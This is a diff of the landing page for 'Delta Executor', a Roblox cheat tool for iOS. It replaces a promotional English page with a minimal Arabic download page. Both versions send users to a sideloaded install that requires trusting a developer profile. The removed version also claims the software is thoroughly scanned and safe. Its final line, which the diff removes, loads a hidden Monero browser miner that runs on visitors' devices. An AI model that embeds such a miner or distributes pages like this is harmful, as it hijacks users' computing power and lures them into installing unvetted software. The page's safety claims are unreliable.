@@ -1,251 +1,82 @@
 <!DOCTYPE html>
-<html lang="en">
-
+<html lang="ar">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Delta Executor</title>
-<!--- <script src="revoke.js?new"></script> --->
-    <!-- SEO & Meta -->
-    <meta name="description"
-        content="Delta Executor is the most popular Roblox exploit for iOS. Download Delta Executor X 2.0 safely without a computer. Regular updates and secure installation." />
-    <meta name="keywords"
-        content="Delta Executor iOS, Roblox exploits iOS, Delta X 2.0 download, mobile Roblox executor, Delta Executor no computer" />
-    <meta name="robots" content="index, follow" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Delta IOS</title>
 
-    <!-- Open Graph / Twitter -->
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="Delta Executor iOS - Download Now" />
-    <meta name="twitter:description" content="The most advanced Roblox executor for iOS. No computer required." />
-    <meta name="twitter:image" content="https://deltaios-executor.com/Icon.jpg" />
+<style>
+body {
+    margin: 0;
+    height: 100vh;
+    background: #000;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    color: #fff;
+}
 
-    <!-- Favicons -->
-    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
-    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+.container {
+    text-align: center;
+}
 
-    <!-- Fonts -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+.title {
+    font-size: 28px;
+    font-weight: bold;
+    margin-bottom: 20px;
+}
 
-    <!-- Styles -->
-    <link rel="stylesheet" href="style.css">
+.app-icon {
+    width: 160px;
+    height: 160px;
+    border-radius: 20px;
+    object-fit: cover;
+    margin-bottom: 25px;
+}
 
-    <!-- Analytics & Scripts -->
-    <script type="text/javascript">
-        (function (c, l, a, r, i, t, y) {
-            c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
-            t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
-            y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
-        })(window, document, "clarity", "script", "tdecgusxt7");
-    </script>
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2K87Z53FJJ"></script>
-    <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag() { dataLayer.push(arguments); }
-        gtag('js', new Date());
-        gtag('config', 'G-2K87Z53FJJ');
-    </script>
-    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2574722752334321"
-        crossorigin="anonymous"></script>
+.install-btn {
+    background: #1db954;
+    color: #fff;
+    border: none;
+    padding: 14px 45px;
+    font-size: 18px;
+    font-weight: bold;
+    border-radius: 12px;
+    cursor: pointer;
+}
 
-    <script>
-        function directInstall() {
-            window.location.href = 'itms-services://?action=download-manifest&url=https://delta.bz/manifest.plist';
-        }
-    </script>
+.install-btn:active {
+    transform: scale(0.96);
+}
+</style>
+
+<script>
+/* نفس زر Direct Install بالضبط */
+function installDelta() {
+    window.location.href =
+    "itms-services://?action=download-manifest&url=https://delta.bz/manifest.plist";
+}
+</script>
 </head>
 
 <body>
-    <div class="container">
-        <header class="hero">
-            <img class="icon" src="Icon.jpg" alt="Delta Executor iOS Icon" />
-            <h1 class="title">Delta Executor</h1>
-            <p class="description">
-                Experience the most advanced Roblox executor for iOS. <br>
-                Secure, fast, and no computer required.
-            </p>
+<div class="container">
+    <div class="title">Delta IOS</div>
 
-            <div class="buttons">
-                <a class="button primary" id="direct-install-btn" href="javascript:void(0);" onclick="directInstall()">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
-                        <polyline points="7 10 12 15 17 10"></polyline>
-                        <line x1="12" y1="15" x2="12" y2="3"></line>
-                    </svg>
-                    Direct Install
-                </a>
+    <!-- صورة Delta -->
+    <img
+      class="app-icon"
+      src="https://i.imgur.com/mEhwyPE.png"
+      alt="Delta Icon"
+    >
 
-                <a class="button secondary" id="ipa-install-btn" href="#popup2">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path
-                            d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z">
-                        </path>
-                        <polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline>
-                        <line x1="12" y1="22.08" x2="12" y2="12"></line>
-                    </svg>
-                    Install iPA/APK
-                </a>
+    <br>
 
-                <a class="button secondary" id="macos-install-btn" href="https://delta.bz/delta.dmg">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
-                        <line x1="8" y1="21" x2="16" y2="21"></line>
-                        <line x1="12" y1="17" x2="12" y2="21"></line>
-                    </svg>
-                    Install for macOS
-                </a>
-            </div>
-
-            <!-- Ad Container -->
-            <div style="margin: 2rem 0;">
-                <script type="text/javascript">
-                    atOptions = {
-                        'key': '1b1071475c84c44c35946eccd7aaec53',
-                        'format': 'iframe',
-                        'height': 250,
-                        'width': 300,
-                        'params': {}
-                    };
-                </script>
-            </div>
-
-
-            <div class="social-container">
-                <a href="https://www.youtube.com/channel/UCcBIs4ID-Tg6l48h0a-axxw" target="_blank"
-                    class="social-button">
-                    <img src="https://skibiditech.co/icon.png" alt="YouTube" class="yt-icon" />
-                    YouTube Channel
-                </a>
-                <a href="https://x.com/CLATechTeam" target="_blank" class="social-button">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
-                        <path
-                            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
-                    </svg>
-                    Follow on X
-                </a>
-
-                <a href="https://discord.gg/deltax" target="_blank" class="social-button">
-                    
-<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
-    <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"></path>
-</svg>Join Discord</a>
-
-           
-
-
-
-
-           </div>
-        </header>
-
-        <main>
-            <section class="content-section">
-                <h2 class="section-title">Why Choose Delta iOS?</h2>
-                <div class="features-grid">
-                    <div class="feature-card">
-                        <h3>Secure Installation</h3>
-                        <p>Advanced encryption and security measures ensure safe app installation every time. Your
-                            privacy is our priority.</p>
-                    </div>
-                    <div class="feature-card">
-                        <h3>Regular Updates</h3>
-                        <p>Stay ahead with automatic updates. We continuously improve performance and add new features.
-                        </p>
-                    </div>
-                    <div class="feature-card">
-                        <h3>Wide Compatibility</h3>
-                        <p>Full support for iOS 12.0+ and all modern devices. Experience seamless performance across the
-                            board.</p>
-                    </div>
-                    <div class="feature-card">
-                        <h3>Fast Downloads</h3>
-                        <p>Our optimized global CDN ensures lightning-fast download speeds wherever you are.</p>
-                    </div>
-                </div>
-            </section>
-
-            <section class="content-section">
-                <h2 class="section-title">Installation Guide</h2>
-                <div class="guide-content">
-                    <h3>Direct Installation</h3>
-                    <ol>
-                        <li>Tap the "Direct Install" button above.</li>
-                        <li>Tap "Install" on the configuration profile prompt.</li>
-                        <li>Go to <strong>Settings > General > VPN & Device Management</strong>.</li>
-                        <li>Trust the developer profile.</li>
-                        <li>Launch Delta from your home screen.</li>
-                    </ol>
-
-                    <h3>IPA Installation</h3>
-                    <ol>
-                        <li>Download the .IPA file using the button above.</li>
-                        <li>Use your preferred IPA installer (AltStore, Sideloadly, etc.).</li>
-                        <li>Follow the installer's specific instructions.</li>
-                        <li>Trust the developer profile if required.</li>
-                    </ol>
-                </div>
-            </section>
-
-            <section class="content-section">
-                <h2 class="section-title">Frequently Asked Questions</h2>
-                <div class="faq-content">
-                    <div class="faq-item">
-                        <div class="faq-question">Is Delta iOS safe to use?</div>
-                        <div class="faq-answer">
-                            Yes, Delta iOS prioritizes user security. All releases are thoroughly scanned and verified
-                            before publication.
-                        </div>
-                    </div>
-                    <div class="faq-item">
-                        <div class="faq-question">Which iOS versions are supported?</div>
-                        <div class="faq-answer">
-                            Delta iOS supports iOS 12.0 and newer, ensuring compatibility with a wide range of iPhone
-                            and iPad models.
-                        </div>
-                    </div>
-                    <div class="faq-item">
-                        <div class="faq-question">How often is it updated?</div>
-                        <div class="faq-answer">
-                            We push updates regularly to patch exploits, improve stability, and add new features as soon
-                            as they're available.
-                        </div>
-                    </div>
-                </div>
-            </section>
-        </main>
-    </div>
-
-    <footer>
-        <p>&copy; 2025 Symaro, LLC. All rights reserved.</p>
-    </footer>
-
-    <!-- IPA/APK Popup -->
-    <div id="popup2" class="overlay1">
-        <div class="popup">
-            <a class="close" href="#">&times;</a>
-            <h3>Download Version</h3>
-
-            <a class="button1" href="https://gloopup.net/Delta/android/">
-                Download APK (Android)
-            </a>
-
-            <a class="button1" href="https://gloopup.net/Delta/ios/">
-                Download iPA (iOS)
-            </a>
-        </div>
-    </div>
-
-    <!-- Analytics -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-CBSYVNWVSE"></script>
-    <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag() { dataLayer.push(arguments); }
-        gtag('js', new Date());
-        gtag('config', 'G-CBSYVNWVSE');
-    </script>
-    <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+    <!-- زر تحميل (نفس Direct Install) -->
+    <button class="install-btn" onclick="installDelta()">
+        تحميل
+    </button>
+</div>
 </body>
-
 </html>
